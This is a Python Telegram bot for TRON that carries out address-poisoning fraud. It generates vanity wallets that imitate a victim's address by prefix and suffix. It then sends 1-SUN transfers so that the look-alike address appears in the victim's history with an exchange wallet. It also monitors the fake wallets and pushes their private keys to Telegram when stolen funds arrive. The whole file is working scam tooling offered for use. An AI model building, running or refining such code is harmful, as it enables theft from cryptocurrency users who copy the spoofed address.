import os
import time
import sqlite3
import logging
import requests
from datetime import datetime, timezone

print("🚀 Starting Vanity & Transfer Executor Bot...")

# --- CONFIGURATION ---
TELEGRAM_BOT_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN", "")
CHAT_ID = os.getenv("CHAT_ID", "")
PRIVATE_KEY = os.getenv("PRIVATE_KEY", "")
TRONGRID_API_KEY = os.getenv("TRONGRID_API_KEY", "")

DATABASE_FILE = "vanity_executor.db"
GAS_COST_PER_TRANSFER = 1.1

logging.basicConfig(level=logging.INFO, format="%(asctime)s | %(levelname)s | %(message)s")
log = logging.getLogger("vanity-bot")

# --- DATABASE SETUP ---
db = sqlite3.connect(DATABASE_FILE, check_same_thread=False)
db.row_factory = sqlite3.Row

db.execute("""
CREATE TABLE IF NOT EXISTS execution_queue (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    wallet_a TEXT NOT NULL,
    wallet_b TEXT NOT NULL,
    wallet_c_address TEXT,
    wallet_c_private_key TEXT,
    prefix_match INTEGER DEFAULT 0,
    suffix_match INTEGER DEFAULT 0,
    status TEXT DEFAULT 'pending',
    tx1_hash TEXT,
    tx2_hash TEXT,
    last_trx_balance REAL DEFAULT 0.0,
    created_at TEXT
)
""")

# Ensure column exists for older DB versions
try:
    db.execute("ALTER TABLE execution_queue ADD COLUMN last_trx_balance REAL DEFAULT 0.0")
except sqlite3.OperationalError:
    pass
db.commit()

TELEGRAM_URL = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}" if TELEGRAM_BOT_TOKEN else ""

def send_telegram(message):
    if not TELEGRAM_URL or not CHAT_ID:
        return False
    try:
        requests.post(
            f"{TELEGRAM_URL}/sendMessage",
            json={"chat_id": CHAT_ID, "text": message, "parse_mode": "HTML", "disable_web_page_preview": True},
            timeout=15
        )
        return True
    except Exception as e:
        log.warning(f"Telegram failed: {e}")
        return False

# ============================================================
# VANITY GENERATION
# ============================================================
def generate_vanity_wallet(target_wallet_b, max_attempts=50000):
    log.info(f"Generating vanity mimicking: {target_wallet_b[:20]}...")
    try:
        from tronpy.keys import PrivateKey
    except ImportError:
        return None, None, 0, 0

    best_addr, best_key, best_score = None, None, 0
    best_prefix, best_suffix = 0, 0

    for _ in range(max_attempts):
        key = PrivateKey.random()
        addr = key.public_key.to_base58check_address()
        
        prefix_match = sum(1 for i in range(8) if i < len(addr) and i < len(target_wallet_b) and addr[i] == target_wallet_b[i])
        suffix_match = sum(1 for i in range(1, 9) if i <= len(addr) and i <= len(target_wallet_b) and addr[-i] == target_wallet_b[-i])
        
        total_score = prefix_match + suffix_match
        
        if total_score > best_score:
            best_score, best_prefix, best_suffix = total_score, prefix_match, suffix_match
            best_addr, best_key = addr, key.hex()
            if best_score >= 8:
                break

    log.info(f"Generated Vanity: {best_prefix}/8 prefix + {best_suffix}/8 suffix = {best_score}/16")
    return best_addr, best_key, best_prefix, best_suffix

# ============================================================
# BACKGROUND MONITORING (INCOMING FUNDS ALERT)
# ============================================================
def monitor_vanity_wallets():
    rows = db.execute("SELECT id, wallet_c_address, wallet_c_private_key, last_trx_balance FROM execution_queue WHERE wallet_c_address IS NOT NULL").fetchall()
    headers = {"TRON-PRO-API-KEY": TRONGRID_API_KEY} if TRONGRID_API_KEY else {}
    
    for row in rows:
        try:
            r = requests.get(f"https://api.trongrid.io/v1/accounts/{row['wallet_c_address']}", params={"only_confirmed": "true"}, headers=headers, timeout=10)
            data = r.json()
            current_balance = int(data.get("data", [{}])[0].get("balance", 0)) / 1_000_000 if data.get("data") else 0.0
            
            if current_balance > row['last_trx_balance'] + 0.1:
                send_telegram(
                    f"🚨 <b>ALERT: Generated Wallet Received Funds!</b>\n\n"
                    f"<b>Address:</b> <code>{row['wallet_c_address']}</code>\n"
                    f"<b>New TRX Balance:</b> {current_balance:.6f} TRX\n\n"
                    f"⚠️ <b>PRIVATE KEY:</b>\n<code>{row['wallet_c_private_key']}</code>\n\n"
                    f"<i>Save this key immediately to access the funds!</i>"
                )
                db.execute("UPDATE execution_queue SET last_trx_balance = ? WHERE id = ?", (current_balance, row['id']))
                db.commit()
        except Exception:
            pass

# ============================================================
# TELEGRAM COMMANDS
# ============================================================
def cmd_add_pair(parts):
    if len(parts) < 3:
        send_telegram("❌ Usage: <code>add [wallet_a] [wallet_b]</code>")
        return

    wallet_a, wallet_b = parts[1].strip(), parts[2].strip()
    send_telegram(f"⏳ <b>Processing Pair...</b>\nGenerating Wallet C to mimic Wallet B...\n<code>{wallet_b[:20]}...</code>")

    addr_c, key_c, prefix, suffix = generate_vanity_wallet(wallet_b)
    if not addr_c:
        send_telegram("❌ Failed to generate vanity wallet.")
        return

    now = datetime.now(timezone.utc).isoformat()
    db.execute("""
        INSERT INTO execution_queue (wallet_a, wallet_b, wallet_c_address, wallet_c_private_key, prefix_match, suffix_match, created_at)
        VALUES (?, ?, ?, ?, ?, ?, ?)
    """, (wallet_a, wallet_b, addr_c, key_c, prefix, suffix, now))
    db.commit()

    send_telegram(
        f"✅ <b>Pair Added & Wallet C Generated!</b>\n\n"
        f"🏦 <b>Wallet A (Target CEX):</b>\n<code>{wallet_a}</code>\n\n"
        f"👤 <b>Wallet B (Original):</b>\n<code>{wallet_b}</code>\n\n"
        f"🎭 <b>Wallet C (Vanity):</b>\n<code>{addr_c}</code>\n\n"
        f"📊 <b>Similarity Score:</b> {prefix}/8 prefix + {suffix}/8 suffix = {prefix + suffix}/16\n\n"
        f"<i>Type <code>transfer</code> when ready to execute.</i>"
    )

def cmd_cost():
    count = db.execute("SELECT COUNT(*) as count FROM execution_queue WHERE status = 'pending'").fetchone()['count']
    if count == 0:
        send_telegram("📭 No pending pairs.")
        return
    total_trx = count * 2 * GAS_COST_PER_TRANSFER
    send_telegram(f"💰 <b>Estimated Cost</b>\nPending pairs: {count}\n<b>Total: ~{total_trx:.2f} TRX</b>")

def cmd_transfer():
    rows = db.execute("SELECT * FROM execution_queue WHERE status = 'pending' ORDER BY id").fetchall()
    if not rows:
        send_telegram("❌ No pending pairs to transfer.")
        return

    send_telegram(f"🚀 <b>Starting Execution for {len(rows)} pairs...</b>")

    try:
        from tronpy import Tron
        from tronpy.keys import PrivateKey
    except ImportError:
        send_telegram("❌ tronpy missing. Check workflow setup.")
        return

    try:
        clean_pk = PRIVATE_KEY.replace('0x', '').replace(' ', '')
        main_priv = PrivateKey(bytes.fromhex(clean_pk))
        tron = Tron()
        main_addr = main_priv.public_key.to_base58check_address()
    except Exception as e:
        send_telegram(f"❌ Failed to load Main Wallet. Check PRIVATE_KEY.\nError: {e}")
        return

    success_count = 0
    for row in rows:
        pair_id, wallet_a, wallet_c_addr, wallet_c_pk = row['id'], row['wallet_a'], row['wallet_c_address'], row['wallet_c_private_key']
        try:
            c_priv = PrivateKey(bytes.fromhex(wallet_c_pk))
            
            # TX 1: Main -> Wallet C (1 SUN = $0)
            tx1 = tron.trx.transfer(main_addr, wallet_c_addr, 1).build().sign(main_priv).broadcast().txid
            time.sleep(3)
            
            # TX 2: Wallet C -> Wallet A (1 SUN = $0)
            tx2 = tron.trx.transfer(wallet_c_addr, wallet_a, 1).build().sign(c_priv).broadcast().txid
            
            db.execute("UPDATE execution_queue SET status = 'completed', tx1_hash = ?, tx2_hash = ? WHERE id = ?", (tx1, tx2, pair_id))
            db.commit()
            
            # ✅ EXPLICIT $0 TRANSFER SUCCESS ALERT
            send_telegram(
                f"✅ <b>$0 Transfer Successful for Pair #{pair_id}!</b>\n\n"
                f"🎭 <b>Wallet C Used:</b>\n<code>{wallet_c_addr}</code>\n\n"
                f"🔗 <b>TX 1 (Main → C):</b>\n<code>{tx1}</code>\n"
                f"🔗 <b>TX 2 (C → A):</b>\n<code>{tx2}</code>\n\n"
                f"<a href='https://tronscan.org/#/transaction/{tx1}'>View TX 1 on TronScan</a>\n"
                f"<a href='https://tronscan.org/#/transaction/{tx2}'>View TX 2 on TronScan</a>"
            )
            success_count += 1
            time.sleep(5)
        except Exception as e:
            send_telegram(f"❌ <b>Pair #{pair_id} Failed:</b>\n{e}")

    if success_count > 0:
        send_telegram(f"🎉 <b>Execution Complete!</b>\nSuccessfully processed {success_count} pairs.")
    
    db.execute("DELETE FROM execution_queue WHERE status = 'completed'")
    db.commit()

def handle_command(text):
    parts = text.strip().split()
    if not parts: return
    cmd = parts[0].lower().lstrip("/")
    
    if cmd == "add": cmd_add_pair(parts)
    elif cmd == "cost": cmd_cost()
    elif cmd == "transfer": cmd_transfer()
    elif cmd == "help":
        send_telegram("<b>Commands:</b>\n<code>add [wallet_a] [wallet_b]</code>\n<code>cost</code>\n<code>transfer</code>")

# ============================================================
# MAIN LOOP
# ============================================================
def main():
    if not all([TELEGRAM_BOT_TOKEN, CHAT_ID, PRIVATE_KEY]):
        log.error("Missing environment variables.")
        return

    send_telegram("🚀 <b>Vanity Executor Bot Started on GitHub Actions</b>\nType <code>help</code> for commands.")
    
    last_update_id = 0
    last_monitor_check = 0
    
    while True:
        current_time = time.time()
        
        # 1. Poll Telegram
        try:
            response = requests.get(f"{TELEGRAM_URL}/getUpdates", params={"offset": last_update_id + 1, "timeout": 30}, timeout=35)
            data = response.json()
            if data.get("ok") and data.get("result"):
                for update in data["result"]:
                    last_update_id = update["update_id"]
                    message = update.get("message")
                    if message and str(message["chat"]["id"]) == str(CHAT_ID):
                        text = message.get("text", "").strip()
                        if text: handle_command(text)
        except Exception:
            pass
            
        # 2. Monitor for incoming funds every 60 seconds
        if current_time - last_monitor_check >= 60:
            monitor_vanity_wallets()
            last_monitor_check = current_time
            
        time.sleep(2)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        log.info("Bot stopped.")
    finally:
        db.close()
